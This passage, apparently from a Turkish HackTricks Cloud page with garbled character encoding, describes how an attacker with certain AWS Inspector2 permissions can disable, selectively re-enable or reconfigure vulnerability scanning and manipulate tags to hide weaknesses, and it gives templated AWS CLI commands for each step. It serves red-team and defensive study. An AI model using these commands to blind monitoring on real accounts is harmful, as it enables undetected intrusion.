- **Potansiyel Etki**: Anahtar hesaplarÄ±n gÃ¼venlik taramalarÄ±ndan dÄ±ÅŸlanmasÄ±, zayÄ±flÄ±klarÄ±n algÄ±lanmadan sÃ¶mÃ¼rÃ¼lmesine olanak tanÄ±r.

### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

`inspector2:Disable` iznine sahip bir saldÄ±rgan, belirli kaynak tÃ¼rlerinde (EC2, ECR, Lambda, Lambda kodu) gÃ¼venlik taramalarÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakabilir ve belirtilen hesaplarda AWS ortamÄ±nÄ±n bazÄ± bÃ¶lÃ¼mlerini denetimsiz bÄ±rakarak saldÄ±rÄ±lara karÅŸÄ± savunmasÄ±z hale getirebilir. AyrÄ±ca, **`inspector2:Enable`** & **`iam:CreateServiceLinkedRole`** izinlerine sahip olan bir saldÄ±rgan, ÅŸÃ¼pheli yapÄ±landÄ±rmalarÄ±n algÄ±lanmasÄ±nÄ± Ã¶nlemek iÃ§in taramalarÄ± seÃ§ici olarak yeniden etkinleÅŸtirebilir.

{% hint style="warning" %}
Bu eylemin, yetkilendirilmiÅŸ yÃ¶netici tarafÄ±ndan gerÃ§ekleÅŸtirilmesi gerekmektedir.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
- **Potansiyel Etki**: GÃ¼venlik izlemede kÃ¶r noktalarÄ±n oluÅŸturulmasÄ±.

### `inspector2:UpdateOrganizationConfiguration`

Bu izne sahip bir saldÄ±rgan, Amazon Inspector kuruluÅŸunuzun yapÄ±landÄ±rmalarÄ±nÄ± gÃ¼ncelleyebilir ve yeni Ã¼ye hesaplarÄ± iÃ§in etkinleÅŸtirilen varsayÄ±lan tarama Ã¶zelliklerini etkileyebilir.

{% hint style="warning" %}

Bu eylemin, yetkilendirilmiÅŸ yÃ¶netici tarafÄ±ndan gerÃ§ekleÅŸtirilmesi gerekmektedir.

{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
- **Potansiyel Etki**: KuruluÅŸun gÃ¼venlik tarama politikalarÄ±nÄ± ve yapÄ±landÄ±rmalarÄ±nÄ± deÄŸiÅŸtirmek.

### `inspector2:TagResource`, `inspector2:UntagResource`

Bir saldÄ±rgan, AWS Inspector kaynaklarÄ± Ã¼zerindeki etiketleri manipÃ¼le edebilir. Bu etiketler, gÃ¼venlik deÄŸerlendirmelerini dÃ¼zenlemek, takip etmek ve otomatikleÅŸtirmek iÃ§in kritiktir. Etiketleri deÄŸiÅŸtirerek veya kaldÄ±rarak, bir saldÄ±rgan gÃ¼venlik taramalarÄ±ndan zafiyetleri gizleyebilir, uyumluluk raporlamasÄ±nÄ± bozabilir ve otomatik iyileÅŸtirme sÃ¼reÃ§lerine mÃ¼dahale edebilir, bu da denetlenmemiÅŸ gÃ¼venlik sorunlarÄ±na ve tehlikeye atÄ±lmÄ±ÅŸ sistem bÃ¼tÃ¼nlÃ¼ÄŸÃ¼ne yol aÃ§abilir.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
- **Potansiyel Etki**: ZayÄ±flÄ±klarÄ±n gizlenmesi, uyumluluk raporlarÄ±nÄ±n bozulmasÄ±, gÃ¼venlik otomasyonunun bozulmasÄ± ve maliyet tahsisinin bozulmasÄ±.

# Referanslar
- [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
- [https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)


{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR'ler gÃ¶ndererek [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}
